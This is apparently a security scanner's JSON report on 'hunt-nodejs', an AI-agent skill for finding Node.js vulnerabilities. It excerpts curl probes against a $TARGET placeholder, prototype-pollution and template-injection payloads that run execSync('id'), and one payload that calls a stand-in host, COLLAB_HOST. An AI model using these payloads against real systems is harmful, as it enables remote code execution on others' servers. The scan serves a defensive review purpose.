@@ -1,0 +1,386 @@
+{
+  "id": "elementalsouls__claude-bughunter__skills~hunt-nodejs",
+  "owner": "elementalsouls",
+  "repo": "Claude-BugHunter",
+  "path": "skills/hunt-nodejs",
+  "name": "hunt-nodejs",
+  "description": "Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.",
+  "stars": 5465,
+  "category": "security",
+  "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+  "contentHash": "559ac04b348f75045baad65b3bee15aafd13a90d3c05322fb6ddafcd5b9c9274",
+  "repoCreatedAt": "2026-05-05T11:22:32Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 15,
+        "excerpt": "- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewCo",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 17,
+        "excerpt": "- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 18,
+        "excerpt": "- **`child_process` injection** — user input interpolated into shell command string → OS command injection",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 39,
+        "excerpt": "# Confirm Node.js/Express",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 40,
+        "excerpt": "curl -sI https://$TARGET/ | grep -i \"x-powered-by\\|nodejs\\|express\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 43,
+        "excerpt": "curl -s \"https://$TARGET/package.json\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 44,
+        "excerpt": "curl -s \"https://$TARGET/package-lock.json\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 45,
+        "excerpt": "curl -s \"https://$TARGET/node_modules/.package-lock.json\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 48,
+        "excerpt": "curl -s \"https://$TARGET/nonexistent-path-xyz\" | grep -i \"node\\|express\\|cannot GET\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 56,
+        "excerpt": "# JSON body injection — test if __proto__ is accepted",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 57,
+        "excerpt": "curl -s -X POST https://$TARGET/api/merge \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 62,
+        "excerpt": "curl -s -X POST https://$TARGET/api/settings \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 67,
+        "excerpt": "curl -s \"https://$TARGET/api/search?__proto__[polluted]=yes&query=test\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 68,
+        "excerpt": "curl -s \"https://$TARGET/api/data?constructor[prototype][admin]=1\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 71,
+        "excerpt": "curl -s \"https://$TARGET/api/me\" | grep -i \"polluted\\|isAdmin\\|admin\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 79,
+        "excerpt": "# If pollution is confirmed, attempt to reach dangerous sinks",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 81,
+        "excerpt": "# Sink 1: child_process via options.shell pollution",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 82,
+        "excerpt": "curl -s -X POST https://$TARGET/api/update \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 93,
+        "excerpt": "curl -s -X POST https://$TARGET/api/render \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 95,
+        "excerpt": "-d '{\"__proto__\": {\"sourceURL\": \"\\nreturn process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\").toString()//\"}}'",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 99,
+        "excerpt": "curl -s -X POST https://$TARGET/api/template \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 101,
+        "excerpt": "-d '{\"__proto__\": {\"outputFunctionName\": \"x;process.mainModule.require(\\\"child_process\\\").execSync(\\\"curl COLLAB_HOST/pp-rce\\\");x\"}}'",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 111,
+        "excerpt": "# If Express has trust proxy enabled, X-Forwarded-For is trusted",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 115,
+        "excerpt": "curl -s -X POST https://$TARGET/api/admin/action \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 121,
+        "excerpt": "curl -s -X POST https://$TARGET/api/internal \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 127,
+        "excerpt": "curl -s https://$TARGET/api/login \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 139,
+        "excerpt": "# EJS SSTI — if user input reaches EJS template context",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 141,
+        "excerpt": "curl -s -X POST https://$TARGET/api/render \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 146,
+        "excerpt": "curl -s -X POST https://$TARGET/api/render \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 148,
+        "excerpt": "-d '{\"template\": \"<%= process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\").toString() %>\"}'",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 151,
+        "excerpt": "curl -s -X POST https://$TARGET/api/render \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 153,
+        "excerpt": "-d '{\"template\": \"- var x = root.process\\n= x.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\")\"}'",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 156,
+        "excerpt": "curl -s -X POST https://$TARGET/api/render \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 158,
+        "excerpt": "-d '{\"template\": \"{{#with \\\"s\\\" as |string|}}{{#with \\\"e\\\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \\\"constructor\\\")}}{{this.pop",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 166,
+        "excerpt": "# Look for endpoints that run shell commands with user input",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nodejs/SKILL.md",
+        "line": 185,
+        "excerpt": "# If LFI exists on Node.js app, /proc/self/environ leaks env vars",
+        "disclosed": true,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 16,
+      "network": 28
+    },
+    "score": 92,
+    "band": "low",
+    "rulesVersion": "1.0.0",
+    "filesScanned": 2,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+      "scannedAt": "2026-11-06T19:07:48.007Z",
+      "score": 92,
+      "rulesVersion": "1.0.0"
+    }
+  ]
+}
